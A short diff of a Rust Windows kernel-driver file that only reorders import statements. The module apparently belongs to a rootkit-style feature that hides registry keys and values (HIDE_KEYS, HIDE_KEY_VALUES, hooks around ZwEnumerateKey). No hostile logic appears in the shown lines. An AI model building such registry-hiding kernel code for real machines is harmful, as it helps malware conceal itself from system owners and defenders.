@@ -1,22 +1,17 @@
 #![allow(non_upper_case_globals)]
 
-use wdk_sys::*;
+use core::{ffi::c_void, mem::size_of, slice::from_raw_parts};
 use wdk::println;
+use wdk_sys::*;
 use wdk_sys::{
-    ntddk::{ZwEnumerateKey, ZwEnumerateValueKey},
     _KEY_INFORMATION_CLASS::{KeyBasicInformation, KeyNameInformation},
     _KEY_VALUE_INFORMATION_CLASS::{
-        KeyValueBasicInformation, KeyValueFullInformation, 
-        KeyValueFullInformationAlign64,
+        KeyValueBasicInformation, KeyValueFullInformation, KeyValueFullInformationAlign64,
     },
-};
-use core::{
-    ffi::c_void, 
-    mem::size_of, 
-    slice::from_raw_parts
+    ntddk::{ZwEnumerateKey, ZwEnumerateValueKey},
 };
 
-use super::{Registry, HIDE_KEYS, HIDE_KEY_VALUES};
+use super::{HIDE_KEY_VALUES, HIDE_KEYS, Registry};
 use alloc::{format, string::String};
 
 /// Checks if a specified registry key is present in the list of hidden keys.
